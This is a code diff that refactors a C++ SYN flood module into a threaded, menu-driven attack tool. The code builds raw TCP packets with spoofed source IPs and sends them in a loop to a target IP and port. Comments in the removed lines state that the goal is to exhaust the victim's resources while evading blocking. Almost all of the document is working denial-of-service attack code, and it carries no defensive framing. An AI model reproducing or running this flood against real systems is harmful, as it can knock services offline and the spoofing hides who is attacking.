@@ -1,100 +1,116 @@
 #include "../headers/syn.h"
 
-// Function to calculate the checksum of a packet
-unsigned short SYN::checksum(void* data, int len) {
-    unsigned short* ptr = (unsigned short*)data;
-    unsigned long sum = 0;
-    
-    // Iterate over the data in 16-bit words
-    while (len > 1) {
-        // Add the current word to the sum
-        sum += *ptr++;
-        // Decrement the length by 2 bytes
-        len -= 2;
-    }
-    // If there is a single byte left, add it to the sum
-    if (len) sum += *(unsigned char*)ptr;
-
-    // Perform the standard checksum folding
-    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
-
-    // Return the negation of the sum
-    return ~sum;
+// Return the name of the attack for menu display
+std::string SYN::get_name() {
+    return "SYN Flood";
 }
 
-/*
-The Goal: Exhaust the Victim's resources (RAM/CPU). 
-The Challenge: Creating valid TCP/IP packets that look
-like they come from random places, so the victim can't block us.
-*/
+// Set module-specific options
+void SYN::set_options(int port, int count) {
+    this->target_port = port;
+    this->packet_count = count;
+}
 
-// SYN flood function
-void SYN::syn_flood(const char* target_ip, int target_port, int packet_count){
+// The main entry point to run the attack.
+// It launches the attack logic in a separate thread.
+void SYN::run(Session* session) {
+    if (session->target_ip.empty()) {
+        std::cerr << "Target IP is not set. Please configure it in the main menu." << std::endl;
+        return;
+    }
+    stop_flag = false;
+    // The syn_flood_loop is launched in a new thread
+    // std::ref is used to pass the session->target_ip by reference
+    attack_thread = std::thread(&SYN::syn_flood_loop, this, session->target_ip);
+    std::cout << get_name() << " started..." << std::endl;
+}
 
-    // Create a raw socket to send TCP packets
-    // AF_INET: We're on layer 3, the OS usually builds the IP header for us
-    // SOCK_RAW: We want to build the entire packet ourselves
-    // IPPROTO_TCP: We will be building TCP packets
+// Signals the attack thread to stop and waits for it to join.
+void SYN::stop() {
+    stop_flag = true;
+    if (attack_thread.joinable()) {
+        attack_thread.join();
+    }
+    std::cout << get_name() << " stopped." << std::endl;
+}
+
+// Destructor ensures the thread is stopped and joined.
+SYN::~SYN() {
+    stop();
+}
+
+// The actual attack logic, designed to run in a loop.
+void SYN::syn_flood_loop(std::string target_ip_str) {
+    const char* target_ip = target_ip_str.c_str();
+
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
         perror("Socket creation failed");
         return;
     }
 
-    // Enable IP header inclusion
     int one = 1;
-    // IP_HDRINCL: Manual override, we tell the OS we will provide the IP header
-    // ourselves so it doesnt add our real IP in the source field.
     setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
 
-    // Target address structure
     sockaddr_in target_addr;
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(target_port);
     inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
 
-    // Packet buffer to hold IP and TCP headers
     char packet[sizeof(iphdr) + sizeof(tcphdr)] = {0};
-
-    // Pointers to IP and TCP headers
     iphdr* ip = (iphdr*)packet;
     tcphdr* tcp = (tcphdr*)(packet + sizeof(iphdr));
 
-    for (int i = 0; i < packet_count; i++) {
-        // Generate a random source IP (spoofing)
+    long current_packet_count = 0;
+
+    // The loop runs as long as stop_flag is false.
+    // It also stops if packet_count is a positive value and the count is reached.
+    while (!stop_flag) {
         std::string spoofed_ip = "192.168.1." + std::to_string(rand() % 255);
-        // saddr: core of the attack, we put a random fake IP in the source field
-        // the victim sends a reply to a ghost, and waits for an ACK that never comes
-        // thus wasting memory (TCB - Transmission Control Block) on half-open connections
         inet_pton(AF_INET, spoofed_ip.c_str(), &ip->saddr);
-        
-        // Fill in IP header fields
-        ip->ihl = 5;  // IP header length
-        ip->version = 4;  // IPv4
-        ip->tos = 0;  // Type of service
-        ip->tot_len = htons(sizeof(packet));  // Total packet length
-        ip->id = htons(rand() % 65535);  // Random packet ID
-        ip->frag_off = 0;  // No fragmentation
-        ip->ttl = 64;  // Time-to-live
-        ip->protocol = IPPROTO_TCP;  // Protocol type (TCP)
-        ip->daddr = target_addr.sin_addr.s_addr;  // Destination IP
-        ip->check = checksum(ip, sizeof(iphdr));  // Compute IP header checksum
 
-        // Fill in TCP header fields
-        tcp->source = htons(rand() % 65535);  // Random source port
-        tcp->dest = htons(target_port);  // Destination port
-        tcp->seq = rand();  // Random sequence number
-        tcp->ack_seq = 0;  // No acknowledgment
-        tcp->doff = 5;  // Data offset (header size)
-        tcp->syn = 1;  // SYN flag set, initiating connection
-        tcp->window = htons(65535);  // Tell the victim to accept large packets of 65535 bytes
-        tcp->check = 0;  // Checksum will be calculated later
+        ip->ihl = 5;
+        ip->version = 4;
+        ip->tos = 0;
+        ip->tot_len = htons(sizeof(packet));
+        ip->id = htons(rand() % 65535);
+        ip->frag_off = 0;
+        ip->ttl = 64;
+        ip->protocol = IPPROTO_TCP;
+        ip->daddr = target_addr.sin_addr.s_addr;
+        ip->check = checksum(ip, sizeof(iphdr));
 
-        // Send the SYN packet
+        tcp->source = htons(rand() % 65535);
+        tcp->dest = htons(target_port);
+        tcp->seq = rand();
+        tcp->ack_seq = 0;
+        tcp->doff = 5;
+        tcp->syn = 1;
+        tcp->window = htons(65535);
+        tcp->check = 0; // Checksum will be calculated later, though not strictly necessary for this attack
+
         if (sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
             perror("Failed to send packet");
         }
+
+        current_packet_count++;
+        if (packet_count > 0 && current_packet_count >= packet_count) {
+            break; // Exit if the desired number of packets have been sent
+        }
     }
 
-    close(sock);  // Close the socket after sending packets
+    close(sock);
+}
+
+// Checksum calculation (remains unchanged)
+unsigned short SYN::checksum(void* data, int len) {
+    unsigned short* ptr = (unsigned short*)data;
+    unsigned long sum = 0;
+    while (len > 1) {
+        sum += *ptr++;
+        len -= 2;
+    }
+    if (len) sum += *(unsigned char*)ptr;
+    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
+    return ~sum;
 }
